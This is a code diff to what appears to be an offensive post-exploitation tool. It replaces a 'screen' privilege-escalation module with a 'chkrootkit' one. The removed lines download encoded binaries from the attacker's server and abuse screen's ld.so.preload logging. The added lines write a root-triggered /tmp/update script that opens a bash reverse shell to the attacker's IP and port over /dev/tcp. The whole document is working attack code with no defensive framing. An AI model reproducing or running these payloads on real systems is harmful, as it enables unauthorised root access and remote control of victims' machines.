@@ -12,15 +12,18 @@ import re
 import time
 
 
-class screen:
+class chkrootkit:
     def exploit(self, socks, ip, port, re_ip, re_port):
+        payload = f'''
+    cat << 'EOF' > /tmp/update
+    #!/bin/bash
+    /bin/bash -c '/bin/bash -i >& /dev/tcp/{re_ip}/{re_port} 0>&1'
+    EOF
+        '''
         time.sleep(2) 
-        core.send_command(socks, f"curl http://{ip}:{port}/plugin/rootshell.txt | base64 -d > /tmp/rootshell ")
-        time.sleep(10)
-        core.send_command(socks, 'chmod +x /tmp/rootshell')
-        time.sleep(2) 
-        core.send_command(socks, f"curl http://{ip}:{port}/plugin/libhax.txt | base64 -d > /tmp/libhax.so ")
-        time.sleep(10)
-        core.send_command(socks, ' cd /etc;umask 000;screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"')
+        core.send_command(socks, payload)
+        time.sleep(3)
+        core.send_command(socks, 'chmod +x /tmp/update')
         time.sleep(1)
-        print("[+] screen privilege escalation completed...")
+        print("[+] chkrootkit privilege escalation completed...")
+
